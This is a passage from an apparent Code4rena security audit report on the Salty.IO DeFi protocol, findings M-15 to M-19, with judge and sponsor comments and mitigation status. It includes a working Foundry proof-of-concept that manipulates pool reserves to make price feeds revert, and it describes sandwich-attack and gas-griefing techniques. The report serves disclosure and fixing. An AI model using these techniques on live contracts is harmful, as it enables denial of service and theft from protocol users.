+			if (block.timestamp < ballots[ballotID].ballotMinimumEndTime)
+			    continue;
			uint256 yesTotal = _votesCastForBallot[ballotID][Vote.YES];
			uint256 noTotal = _votesCastForBallot[ballotID][Vote.NO];

			if ( (yesTotal + noTotal) >= quorum ) // Make sure that quorum has been reached
			if ( yesTotal > noTotal )  // Make sure the token vote is favorable
			if ( yesTotal > mostYes )  // Make sure these are the most yes votes seen
				{
				bestID = ballotID;
				mostYes = yesTotal;
				}
			}

		return bestID;
		}
```

</details>


**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/556#issuecomment-1960694992):**
 > Removed maxPendingTokensForWhitelisting.<br>
> There is now no limit to the number of tokens that can be proposed for whitelisting.<br>
> Also, any whitelisting proposal that has reached quorum with sufficient approval votes can be executed.

>https://github.com/othernet-global/salty-io/commit/ccf4368

**Status:** Mitigation confirmed. Full details in reports from [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/79), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/97), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/7).

***

## [[M-15] Attacker can take advantage of Chainlink price not occuring within it's 60 minute heartbeat to make PriceAggregator calls fail](https://github.com/code-423n4/2024-01-salty-findings/issues/486)
*Submitted by [israeladelaja](https://github.com/code-423n4/2024-01-salty-findings/issues/486), also found by [jasonxiale](https://github.com/code-423n4/2024-01-salty-findings/issues/1062), [VAD37](https://github.com/code-423n4/2024-01-salty-findings/issues/501), and [PENGUN](https://github.com/code-423n4/2024-01-salty-findings/issues/372)*

<https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreChainlinkFeed.sol#L45> 

<https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreSaltyFeed.sol#L34> 

<https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreSaltyFeed.sol#L47>

Salty.IO relies on three default price feeds to get the price of BTC and ETH for the price of the collateral backing USDS. In the `CoreChainlinkFeed` contract, a price of 0 is returned when the Chainlink price update has not occurred within it's 60 minute heartbeat. When this happens, the other two price feeds being the Uniswap V3 TWAP and the Salty.IO Reserves would provide the necessary price feed data. However, using the reserves of a liquidity pool directly for price data is dangerous as a user can skew the ratio of the tokens in the pool by simply swapping one for the other. This issue becomes more concerning when flash loans are involved, giving anyone a large amount of tokens temporarily to significantly skew the ratio of the pool. This means that when the Chainlink price update has not occurred within it's 60 minute heartbeat, an attacker can skew the ratio of the Salty.IO Reserves and artificially change the price of BTC or ETH in their respective pools paired with USDS. This will inevitably make the `PriceAggregator` contract revert when price data is needed (because there are two non zero price feeds and the difference between these prices is too large).

### Proof of Concept

This is part of the `CoreChainlinkFeed.latestChainlinkPrice()` function which returns the price of a token in a given Chainlink price feed:

<details>

```solidity
try chainlinkFeed.latestRoundData()
returns (
  uint80, // _roundID
  int256 _price,
  uint256, // _startedAt
  uint256 _answerTimestamp,
  uint80 // _answeredInRound
)
  {
  // Make sure that the Chainlink price update has occurred within its 60 minute heartbeat
  // https://docs.chain.link/data-feeds#check-the-timestamp-of-the-latest-answer
  uint256 answerDelay = block.timestamp - _answerTimestamp;

  if ( answerDelay <= MAX_ANSWER_DELAY )
    price = _price;
  else
    price = 0;
  }
catch (bytes memory) // Catching any failure
  {
  // In case of failure, price will remain 0
  }
```
</details>

These are both functions of the `CoreSaltyFeed` contract which return the price of BTC and ETH based on the reserves of their respective pools paired with USDS:

<details>

```solidity
// Returns zero for an invalid price
function getPriceBTC() external view returns (uint256)
  {
      (uint256 reservesWBTC, uint256 reservesUSDS) = pools.getPoolReserves(wbtc, usds); // @audit-issue Pool reserves can be skewed by someone with enough tokens. Maybe TWAP is better here

  if ( ( reservesWBTC < PoolUtils.DUST ) || ( reservesUSDS < PoolUtils.DUST ) )
    return 0;

  // reservesWBTC has 8 decimals, keep the 18 decimals of reservesUSDS
  // @audit-ok Math checks out
  return ( reservesUSDS * 10**8 ) / reservesWBTC;
  }


// Returns zero for an invalid price
function getPriceETH() external view returns (uint256)
  {
      (uint256 reservesWETH, uint256 reservesUSDS) = pools.getPoolReserves(weth, usds); // @audit-info Pool reserves can be skewed by someone with enough tokens. Maybe TWAP is better here. Same as above.

  if ( ( reservesWETH < PoolUtils.DUST ) || ( reservesUSDS < PoolUtils.DUST ) )
    return 0;

  // @audit-ok Math checks out
  return ( reservesUSDS * 10**18 ) / reservesWETH;
  }
  }
```
</details>

As can be seen, the `CoreSaltyFeed` contract relies on the reserves of the WBTC/USDS and WETH/USDS pool. This is dangerous as the ratios of the pools can easily be skewed by an attacker with enough tokens.

Clone the github repo and run `forge build` then paste the following test file in `/src/scenario_tests/` and run `forge test --mt test_exploitChainlinkLongHeartbeatPOC`:

<details>
  <summary>POC Test File</summary>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.22;

import "../dev/Deployment.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../rewards/RewardsConfig.sol";
import "../staking/StakingConfig.sol";
import "../price_feed/tests/ForcedPriceFeed.sol";
import "../price_feed/CoreSaltyFeed.sol";
import "../price_feed/CoreChainlinkFeed.sol";

contract MockAccessManager {
    function walletHasAccess(address wallet) external pure returns (bool) {
        return wallet == wallet;
    }
}

contract MockInitialDistribution {
    address public bootstrapBallot;

    constructor(address _bootstrapBallot) {
        bootstrapBallot = _bootstrapBallot;
    }
}

// Mock contract to imitate when chainlink price doesn't occur within its 60 minute heartbeat
contract MockAggregatorV3Interface {
    function latestRoundData()
        external
        pure
        returns (uint80, int256, uint256, uint256, uint80)
    {
        return (0, 0, 0, 0, 0);
    }
}

contract ExploitChainlinkLongHeartbeatPOC is Test {
    using SafeERC20 for ISalt;
    using SafeERC20 for IERC20;

    IExchangeConfig public exchangeConfig;
    IBootstrapBallot public bootstrapBallot;
    IAirdrop public airdrop;
    IStaking public staking;
    IDAO public dao;
    ILiquidizer public liquidizer;

    IPoolsConfig public poolsConfig;
    IStakingConfig public stakingConfig;
    IRewardsConfig public rewardsConfig;
    IStableConfig public stableConfig;
    ISaltRewards public saltRewards;
    IPools public pools;
    MockInitialDistribution public initialDistribution;

    IRewardsEmitter public stakingRewardsEmitter;
    IRewardsEmitter public liquidityRewardsEmitter;
    IEmissions public emissions;

    ISalt public salt;
    IERC20 public dai;
    USDS public usds;
    IERC20 public wbtc;
    IERC20 public weth;

    CollateralAndLiquidity public collateralAndLiquidity;
    MockAccessManager public accessManager;

    IPriceFeed public priceFeed1;
    IPriceFeed public priceFeed2;
    IForcedPriceFeed public priceFeed3;

    IPriceAggregator public priceAggregator;
    IUpkeep public upkeep;
    IDAOConfig public daoConfig;

    function setUp() public {
        vm.startPrank(address(1));
        salt = new Salt();
        dai = new TestERC20("DAI", 18);
        weth = new TestERC20("WETH", 18);
        wbtc = new TestERC20("WBTC", 8);
        usds = new USDS();

        rewardsConfig = new RewardsConfig();
        poolsConfig = new PoolsConfig();
        stakingConfig = new StakingConfig();
        stableConfig = new StableConfig();
        daoConfig = new DAOConfig();

        exchangeConfig = new ExchangeConfig(
            salt,
            wbtc,
            weth,
            dai,
            usds,
            IManagedWallet(address(0))
        );

        stakingRewardsEmitter = new RewardsEmitter(
            IStakingRewards(makeAddr("stakingRewards")),
            exchangeConfig,
            poolsConfig,
            IRewardsConfig(address(0)),
            false
        );

        liquidityRewardsEmitter = new RewardsEmitter(
            IStakingRewards(makeAddr("stakingRewards")),
            exchangeConfig,
            poolsConfig,
            IRewardsConfig(address(0)),
            true
        );

        pools = new Pools(exchangeConfig, poolsConfig);

        MockAggregatorV3Interface CHAINLINK_BTC_USD = new MockAggregatorV3Interface();
        MockAggregatorV3Interface CHAINLINK_ETH_USD = new MockAggregatorV3Interface();

        priceFeed1 = new CoreChainlinkFeed(
            address(CHAINLINK_BTC_USD),
            address(CHAINLINK_ETH_USD)
        );
        priceFeed2 = new CoreSaltyFeed(pools, exchangeConfig);
        priceFeed3 = new ForcedPriceFeed(30000 ether, 3000 ether);

        priceAggregator = new PriceAggregator();
        priceAggregator.setInitialFeeds(
            IPriceFeed(address(priceFeed1)),
            IPriceFeed(address(priceFeed2)),
            IPriceFeed(address(priceFeed3))
        );

        saltRewards = new SaltRewards(
            stakingRewardsEmitter,
            liquidityRewardsEmitter,
            exchangeConfig,
            rewardsConfig
        );

        initialDistribution = new MockInitialDistribution(
            makeAddr("bootstrapBallot")
        );

        poolsConfig.whitelistPool(pools, salt, wbtc);
        poolsConfig.whitelistPool(pools, salt, weth);
        poolsConfig.whitelistPool(pools, salt, usds);
        poolsConfig.whitelistPool(pools, wbtc, usds);
        poolsConfig.whitelistPool(pools, weth, usds);
        poolsConfig.whitelistPool(pools, wbtc, dai);
        poolsConfig.whitelistPool(pools, weth, dai);
        poolsConfig.whitelistPool(pools, usds, dai);
        poolsConfig.whitelistPool(pools, wbtc, weth);

        liquidizer = new Liquidizer(exchangeConfig, poolsConfig);

        accessManager = new MockAccessManager();
        exchangeConfig.setAccessManager(IAccessManager(address(accessManager)));

        collateralAndLiquidity = new CollateralAndLiquidity(
            pools,
            exchangeConfig,
            poolsConfig,
            stakingConfig,
            stableConfig,
            priceAggregator,
            liquidizer
        );

        usds.setCollateralAndLiquidity(collateralAndLiquidity);

        dao = new DAO(
            pools,
            IProposals(address(0)),
            exchangeConfig,
            poolsConfig,
            IStakingConfig(address(0)),
            IRewardsConfig(address(0)),
            IStableConfig(address(0)),
            IDAOConfig(address(0)),
            IPriceAggregator(address(0)),
            liquidityRewardsEmitter,
            ICollateralAndLiquidity(address(collateralAndLiquidity))
        );

        pools.setContracts(dao, collateralAndLiquidity);

        liquidizer.setContracts(collateralAndLiquidity, pools, dao);

        vm.stopPrank();

        vm.startPrank(address(1));
        upkeep = new Upkeep(
            pools,
            exchangeConfig,
            poolsConfig,
            daoConfig,
            stableConfig,
            priceAggregator,
            saltRewards,
            collateralAndLiquidity,
            emissions,
            dao
        );
        exchangeConfig.setContracts(
            dao,
            upkeep,
            IInitialDistribution(address(initialDistribution)),
            IAirdrop(address(0)),
            VestingWallet(payable(address(0))),
            VestingWallet(payable(address(0)))
        );
        vm.stopPrank();

        vm.prank(makeAddr("bootstrapBallot"));
        pools.startExchangeApproved();

        vm.prank(address(collateralAndLiquidity));
        usds.mintTo(address(1), 60_000 ether);

        vm.startPrank(address(1));
        wbtc.approve(address(collateralAndLiquidity), 1 * 10 ** 8);
        weth.approve(address(collateralAndLiquidity), 100 * 10 ** 18);
        usds.approve(address(collateralAndLiquidity), 60_000 ether);
        collateralAndLiquidity.depositLiquidityAndIncreaseShare(
            wbtc,
            usds,
            1 * 10 ** 8,
            30_000 ether,
            0,
            block.timestamp,
            false
        );
        collateralAndLiquidity.depositLiquidityAndIncreaseShare(
            weth,
            usds,
            10 * 10 ** 18,
            30_000 ether,
            0,
            block.timestamp,
            false
        );
        vm.stopPrank();
    }

    function test_exploitChainlinkLongHeartbeatPOC() external {
        address alice = makeAddr("alice");

        // Initial price is fine as it is using uniswap v3 twap and salty pool as price feed
        uint256 priceBTC = priceAggregator.getPriceBTC();
        uint256 priceETH = priceAggregator.getPriceETH();
        console.log(priceBTC);
        console.log(priceETH);

        vm.prank(address(1));
        wbtc.safeTransfer(alice, 0.5 * 10 ** 8);

        vm.startPrank(alice);
        wbtc.approve(address(pools), 0.5 * 10 ** 8);

        // Swapping WBTC to USDS skews the ratios in the pool making the price of WBTC differ from the uniswap v3 price therefore making the priceAggregator return 0 for the price of BTC
        pools.depositSwapWithdraw(
            wbtc,
            usds,
            0.5 * 10 ** 8,
            0,
            block.timestamp
        );
        vm.stopPrank();

        vm.prank(address(1));
        weth.safeTransfer(alice, 5 * 10 ** 18);

        vm.startPrank(alice);
        weth.approve(address(pools), 5 * 10 ** 18);

        // Swapping WETH to USDS skews the ratios in the pool making the price of WETH differ from the uniswap v3 price therefore making the priceAggregator return 0 for the price of ETH
        pools.depositSwapWithdraw(weth, usds, 5 * 10 ** 18, 0, block.timestamp);
        vm.stopPrank();

        // Getting price data now fails
        vm.expectRevert();
        priceAggregator.getPriceBTC();
        vm.expectRevert();
        priceAggregator.getPriceETH();
    }
}
```

</details>

As can be seen, because the `CoreChainlinkFeed` contract has returned a price of 0, the `PriceAggregator` contract is left to rely on the other two price feeds, including the Salty.IO Reserves. However, an attacker can make calls for price data to `PriceAggregator` fail by skewing the ratios of the WBTC/USDS and WETH/USDS pool, making the prices of the two price feeds deviate from each other above the allowed threshold.

### Recommended Mitigation Steps

A TWAP for the Salty.IO Reserves would be recommended to smooth off any significant price movement and decrease the chance of there being a significant deviation from the real world price.

**[Picodes (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/486#issuecomment-1952277436):**
 > Medium severity is appropriate as a protocol's functionality is broken but the reports doesn't show how to extract funds using this.

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/486#issuecomment-1953431903):**
 > Chainlink timeout now set to 65 minutes:
> 
> https://github.com/othernet-global/salty-io/commit/f9a830c61e77a22722a8e674a8affabe2a0cf04a

 > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:
> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9


**Status:** Mitigation confirmed. Full details in reports from [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/18), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/98), and [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/80).

***

## [[M-16] Suboptimal arbitrage implementation](https://github.com/code-423n4/2024-01-salty-findings/issues/419)
*Submitted by [fnanni](https://github.com/code-423n4/2024-01-salty-findings/issues/419), also found by [t0x1c](https://github.com/code-423n4/2024-01-salty-findings/issues/160)*

The `bestArbAmountIn` estimated in [\_bisectionSearch()](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/arbitrage/ArbitrageSearch.sol#L101-L136) can be calculated with a simple formula. Roughly estimating `bestArbAmountIn` instead of deriving its exact value has the following consequences:

1.  In some scenarios, arbitrage profits are missed completely.
2.  In most cases, arbitrage profits are not optimal.
3.  It could be profitable to sandwich-attack certain swaps. The pre-transaction would push the pools into scenario 1., then the post-transaction would recover the investment + arbitrage, capturing the arbitrage profits that were meant for the DAO.

This issue may look like a mere optimization. However, if the math presented next is correct, I'd argue that this is a medium issue. Built-in arbitrage is the main feature and competitive advantage of Salty.IO. Missing arbitrage profits due to a flawed implementation should not happen.

### Proof of Concept

**Notation**

The notation used is equal to the one found in the Salty.IO smart contracts, in particular in [ArbitrageSearch.sol](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/arbitrage/ArbitrageSearch.sol). For convenience, $$reservesXN$$ is replaced with just $$XN$$. For example, $$A1$$ should be read as $$reservesA1$$.

Some of the math steps were omitted to simplify this submission, but I invite you to verify the derivation of the formulas.

**Max arbitrage profit formula**

The arbitrage function is given by $$f(a) = \frac{n\_1a}{n\_2 + ma} - a$$, where:

*   $$a$$ (a.k.a. `bestArbAmountIn`) is the amount of WETH to be "sold" for arbToken2 in the first step of the arbitrage path weth -> arbToken2 -> arbToken3 -> weth.
*   $$n\_1 = C1 \* B1 \* A1$$
*   $$n\_2 = C0 \* B0 \* A0$$
*   $$m = C0 \* B0 + C0 \* A1 + B1 \* A1$$

Note that:

1.  $$f(0) = 0$$
2.  $$f(\inf) = -\inf$$
3.  $$max{f(a)}\_{a>0} > 0$$ only if $$n\_1 > n\_2$$. If this is not obvious at first sight, derive $$f$$ and find its roots for $$a>0$$.

So, when $$n\_1 > n\_2$$, we know there is an arbitrage opportunity which maximizes at:

$$a = \frac{\sqrt{A0*A1*B0*B1*C0\*C1} - n\_2}{m}$$

Using similar methods as currently in PoolMath.sol, overflow can be avoided and the formula above can be used to execute the arbitrage feature optimally.

**Missing arbitrage profits completely**

So far we've seen how to improve the arbitrage calculation to properly maximize profits. What's more interesting is that certain pools could get into states in which arbitrage opportunities are missed entirely. This should be concerning taking into account that built-in arbitrage is the main feature of the protocol and thus should always be available.

Let $$a\_0>0$$ be a root of the arbitrage function such that $$f(a\_0)=0$$ and $$f(a>a\_0)<0$$. The solution is given by $$a\_0=\frac{n\_1-n\_2}{m}$$. For simplicity, now assume that (i) the pools in the arbitrage path are balanced and (ii) a user wants to swap weth (let's call this amount $$x$$) for arbToken3. We are interested in finding a pool structure such that 1/128th of $$x$$ is greater than $$a\_0$$. This would mean that the protocol's bisection search will test a range of $$f$$ which is not profitable, when there are actually values that are profitable.

The formula we get from the mentioned assumptions is:

$$0\<x<\frac{C1}{127B1*A1}(C0*B0 + C0*A1 - 255B1*A1)$$

which means that:

$$C0>255\frac{B1\*A1}{A1+B0}$$

These conditions are a bit restrictive, but we can still find realistic scenarios in which they hold. To test the idea, add [these](https://gist.github.com/fnanni-0/6d0050cd00cd08194d714fe13c4443cb) functions to TestArbitrageSearch.sol and then add the [this](https://gist.github.com/fnanni-0/eef46ebd5f82c05291a5a55916bd9b90) test to TestArbitrageSearch.t.sol. In the tested example, the protocol misses profits at least in the range of 2-2000 ETH<>BTC swaps for the given pools state.

### Recommended Mitigation Steps

Consider replacing \_bisectionSearch() with something similar to [computeBestArbitrage()](https://gist.github.com/fnanni-0/6d0050cd00cd08194d714fe13c4443cb). Beware that computeBestArbitrage() is not overflow-proof.

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/419#issuecomment-1935238212):**
 > Works great! Thank you!
> 
> I modified the calculations to reduce overflow risk:
> 
> 			uint256 n0 = A0 * B0 * C0;
> 			uint256 n1 = A1 * B1 * C1;
> 			if (n1 <= n0)
> 				return 0;
> 
> 			uint256 m = A1 * ( B1 + C0 ) + C0 * B0;
> 			uint256 z = PoolMath._sqrt( (n0 / m) * (n1 / m) );
> 
> 			bestArbAmountIn = z - n0 / m;

 > Added an MSB shift to prevent overflow:
> https://github.com/othernet-global/salty-io/commit/a54656dd18135ca57eef7c4bf615b7cdff2613a7
> https://github.com/othernet-global/salty-io/commit/53feaeb0d335bd33803f98db022871b48b3f2454
> 
> 
> 
> 		uint256 maximumMSB = _maximumReservesMSB( A0, A1, B0, B1, C0, C1 );
> 
> 			// Assumes the largest number should use no more than 80 bits.
> 			// Multiplying three 80 bit numbers will yield 240 bits - within the 256 bit limit.
> 			uint256 shift = 0;
> 			if ( maximumMSB > 80 )
> 				{
> 				shift = maximumMSB - 80;
> 
> 				A0 = A0 >> shift;
> 				A1 = A1 >> shift;
> 				B0 = B0 >> shift;
> 				B1 = B1 >> shift;
> 				C0 = C0 >> shift;
> 				C1 = C1 >> shift;
> 				}
> 
> 			// Each variable will use less than 80 bits
> 			uint256 n0 = A0 * B0 * C0;
> 			uint256 n1 = A1 * B1 * C1;
> 
> 			if (n1 <= n0)
> 				return 0;
> 
> 			uint256 m = A1 *  B1 + C0 * ( B0 + A1 );
> 
> 			// Calculating n0 * n1 directly would overflow under some situations.
> 			// Multiply the sqrt's instead - effectively keeping the max size the same
> 			uint256 z = Math.sqrt(n0) * Math.sqrt(n1);
> 
> 			bestArbAmountIn = ( z - n0 ) / m;
> 			
> 			

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/419#issuecomment-1952924257):**
 > Considering the value-added for the sponsor and the fact that this report:
>  - Is actually saving funds for the protocol
>  - Shows that a functionality is in some specific case broken (which we know as the bisection search isn't exact) could be fixed relatively easily
> 
> I think Med severity is appropriate.

**Status:** Mitigated with an Error. Full details in report from [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/101), and also included in the [Mitigation Review](#mitigation-review) section below.

***

## [[M-17] Caller of Upkeep may skip step 11 to save gas](https://github.com/code-423n4/2024-01-salty-findings/issues/383)
*Submitted by [handsomegiraffe](https://github.com/code-423n4/2024-01-salty-findings/issues/383)*

In Upkeep.sol, `performUpkeep()` is expected to be called by anyone who wishes to earn the 5% incentive. The function runs through steps 1 to 11, each wrapped in a try/catch block to prevent reversions from blocking the entire function.

A dishonest user may call `performUpkeep` but provide only sufficient gas for steps 1 to 10. Step 11 would revert and the user still receives the incentive for performing the upkeep.

This attack is possible due to the EIP150 rule where 63/64 of gas is forwarded to an external call. If insufficient gas is sent to complete step 11, the remaining 1/64 gas could still be sufficient to emit the error and continue without reverting.

```solidity
try this.step11() {}
catch (bytes memory error) { emit UpkeepError("Step 11", error); }
```

### Impact

The user benefits from gas saved by not having to run step 11. Step 11 sends SALT from the team vesting wallet to the team; skipping this step this could cause issues for the team by not receiving expected SALT at each upkeep.

### Recommended Mitigation Steps

Check that sufficient gas is sent at the start of the function call.

**[othernet-global (Salty.IO) acknowledged](https://github.com/code-423n4/2024-01-salty-findings/issues/383#issuecomment-1933768838)**

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/383#issuecomment-1954913519):**
 > This report shows how a user could potentially be rewarded and not execute the tasks correctly, so would essentially steal funds from the DAO.

***

## [[M-18]  `_getUniswapTwapWei()` will show incorrect price for negative ticks cause it doesn't round up for negative ticks](https://github.com/code-423n4/2024-01-salty-findings/issues/380)
*Submitted by [Bauchibred](https://github.com/code-423n4/2024-01-salty-findings/issues/380), also found by [grearlake](https://github.com/code-423n4/2024-01-salty-findings/issues/760)*

Take a look at <https://github.com/code-423n4/2024-01-salty/blob/f742b554e18ae1a07cb8d4617ec8aa50db037c1c/src/price_feed/CoreUniswapFeed.sol#L49-L75>

<details>

```solidity
	// Returns amount of token0 * (10**18) given token1
    function _getUniswapTwapWei( IUniswapV3Pool pool, uint256 twapInterval ) public view returns (uint256)
    	{
		uint32[] memory secondsAgo = new uint32[](2);
		secondsAgo[0] = uint32(twapInterval); // from (before)
		secondsAgo[1] = 0; // to (now)

        // Get the historical tick data using the observe() function
         (int56[] memory tickCumulatives, ) = pool.observe(secondsAgo);
		//@audit
		int24 tick = int24((tickCumulatives[1] - tickCumulatives[0]) / int56(uint56(twapInterval)));
		uint160 sqrtPriceX96 = TickMath.getSqrtRatioAtTick( tick );
		uint256 p = FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, FixedPoint96.Q96 );

		uint8 decimals0 = ( ERC20( pool.token0() ) ).decimals();
		uint8 decimals1 = ( ERC20( pool.token1() ) ).decimals();

		if ( decimals1 > decimals0 )
			return FullMath.mulDiv( 10 ** ( 18 + decimals1 - decimals0 ), FixedPoint96.Q96, p );

		if ( decimals0 > decimals1 )
			return ( FixedPoint96.Q96 * ( 10 ** 18 ) ) / ( p * ( 10 ** ( decimals0 - decimals1 ) ) );

		return ( FixedPoint96.Q96 * ( 10 ** 18 ) ) / p;
    	}

```
</details>

This function is used to get twap price tick using uniswap oracle. it uses `pool.observe()` to get `tickCumulatives` array which is then used to calculate `int24 tick`.

The problem is that in case if `int24(tickCumulatives[1] - tickCumulatives[0])` is negative, then the tick should be rounded down as it's done in the[ uniswap library](https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/OracleLibrary.sol#L36).

As result, in case if `int24(tickCumulatives[1] - tickCumulatives[0])` is negative and `(tickCumulatives[1] - tickCumulatives[0]) % secondsAgo != 0`, then returned tick will be bigger then it should be, which opens possibility for some price manipulations and arbitrage opportunities.

### Impact

In case if ` int24(tickCumulatives[1] - tickCumulatives[0])  `is negative and `((tickCumulatives[1] - tickCumulatives[0]) % secondsAgo != 0`, then returned tick will be bigger than it should be which places protocol wanting prices to be right not be able to achieve this goal, note that where as protocol still relies on multiple sources of price, they still come down and end on weighing the differences between the prices and reverting if a certain limit is passed, effectively causing the pricing logic to be unavailable and also reverting on important functions like `CollateralAndLiquidity::liquidate()` cause a call to `underlyingTokenValueInUSD()` is made which would not be available.

### Recommended Mitigation Steps

Add this line:
`if (tickCumulatives[1] - tickCumulatives[0] < 0 && (tickCumulatives[1] - tickCumulatives[0]) % secondsAgo != 0) timeWeightedTick --;`

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/380#issuecomment-1950451692):**
 > Now rounds down for negative ticks as suggested.
> 
> https://github.com/othernet-global/salty-io/commit/4625393e9bd010778003a1424201513885068800

 > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:
> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9

**Status:** Mitigation confirmed. Full details in reports from [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/19), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/99), and [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/81).


***

## [[M-19] No proposal time limit traps sponsors of unpopular proposals](https://github.com/code-423n4/2024-01-salty-findings/issues/362)
*Submitted by [0xBinChook](https://github.com/code-423n4/2024-01-salty-findings/issues/362), also found by [0x3b](https://github.com/code-423n4/2024-01-salty-findings/issues/1067), [0xRobocop](https://github.com/code-423n4/2024-01-salty-findings/issues/1064), [ether\_sky](https://github.com/code-423n4/2024-01-salty-findings/issues/1055), [pina](https://github.com/code-423n4/2024-01-salty-findings/issues/902), [Tripathi](https://github.com/code-423n4/2024-01-salty-findings/issues/824), [0xpiken](https://github.com/code-423n4/2024-01-salty-findings/issues/670), [juancito](https://github.com/code-423n4/2024-01-salty-findings/issues/625), [SpicyMeatball](https://github.com/code-423n4/2024-01-salty-findings/issues/547), [erosjohn](https://github.com/code-423n4/2024-01-salty-findings/issues/350), [fnanni](https://github.com/code-423n4/2024-01-salty-findings/issues/119), and [cats](https://github.com/code-423n4/2024-01-salty-findings/issues/47)*

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L396-L397> 

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L281-L281>

A staker is restricted to sponsoring a single proposal at any given time. This proposal remains active until a predetermined duration has elapsed, and it has received the sufficient number of votes to reach a quorum, after which it can be finalized.

However, if a staker sponsors a proposal that fails to attract the necessary quorum of votes, it remains indefinitely in an active state. This situation effectively locks the staker in a position where they cannot propose any new initiatives, as they are stuck with an unresolved proposal.

There is no mechanism for sponsors to withdraw or cancel their proposals. So when a proposal is unable to achieve quorum, the sponsor is left in a predicament where they are unable to further participate in the governance through the initiation of new proposals.

Furthermore, there is a noticeable lack of motivation for stakers to vote against proposals that are not on track to meet the quorum. As these proposals cannot pass without achieving the required quorum, resulting in a situation where voting against such proposals does not offer any tangible benefit.

### Proof of Concept

Steps:

1.  Staker creates a valid proposal
2.  Sufficient time passes
3.  Insufficient votes are received to reach quorum
4.  Staker has an active proposal they cannot close (preventing create a new proposal)

**A staker can have only one active proposal**

Within `Proposals` stakers are identified as `users` and when creating a proposal there is a check [Proposals::\_possiblyCreateProposal()](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L98)

```solidity
			// Make sure that the user doesn't already have an active proposal
			require( ! _userHasActiveProposal[msg.sender], "Users can only have one active proposal at a time" );
```

With the state being pushed later in [Proposals::\_possiblyCreateProposal()](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L113-L115)

```solidity
		// Remember that the user made a proposal
		_userHasActiveProposal[msg.sender] = true;
		_usersThatProposedBallots[ballotID] = msg.sender;
```

**A proposal can only be finalized after sufficient time has passed**

The check to ensure the minimum time has passed in [Proposals::canFinalizeBallot()](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L39-L393)

```solidity
        // Check that the minimum duration has passed
        if (block.timestamp < ballot.ballotMinimumEndTime )
            return false;
```

**A proposal can only be finalized after quorum is reached**

The check to ensure quorum is reached in [Proposals::canFinalizeBallot()](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L395-L397)

```solidity
        // Check that the required quorum has been reached
        if ( totalVotesCastForBallot(ballotID) < requiredQuorumForBallotType( ballot.ballotType ))
            return false;
```

<details>
<summary>Test Case</summary>
User sponsors a proposal that fails to reach quorum cannot be finalized and with no other way to close will have an active proposal, preventing further proposals.

Add the test case to [Proposals.t.sol](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/tests/Proposals.t.sol#L1717)

```solidity
    function test_quorum_needed_to_finalize_ballot() external {
        uint256 ballotID = 1;
        uint256 stakeAmount = 250000 ether;

        // Fund Alice, Bob and Charlie with equal SALT
        vm.startPrank( DEPLOYER );
        salt.transfer( alice, stakeAmount );
        salt.transfer( bob, stakeAmount );
        salt.transfer( charlie, stakeAmount );
        vm.stopPrank();

        // Alice, Bob and Charlie all stake their equal amounts of SALT
        _stakeSalt(alice, stakeAmount);
        _stakeSalt(bob, stakeAmount);
        _stakeSalt(charlie, stakeAmount);

        // Alice proposes a ballot
        vm.prank(alice);
        proposals.proposeCountryInclusion("US", "proposed ballot");

        // Alice votes YES
        vm.prank(alice);
        proposals.castVote( ballotID, Vote.YES );

        // Now, we allow some time to pass in order to finalize the ballot
        vm.warp(block.timestamp + daoConfig.ballotMinimumDuration());

        // The ballot cannot be finalized as quorum is not reached
        assertFalse(proposals.canFinalizeBallot(ballotID), "Ballot cannot be finalized");
